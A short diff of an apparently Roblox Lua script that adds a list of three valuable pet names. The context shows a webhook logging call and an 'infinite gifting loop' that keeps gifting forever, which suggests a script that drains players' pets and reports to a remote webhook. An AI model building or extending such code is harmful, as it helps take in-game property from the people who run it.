@@ -673,6 +673,12 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
+local ValidPets = {
+    ["Peacock"] = true,
+    ["Bald Eagle"] = true,
+    ["Nightmare Seal"] = true,
+}
+
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
         task.spawn(function()
             while true do
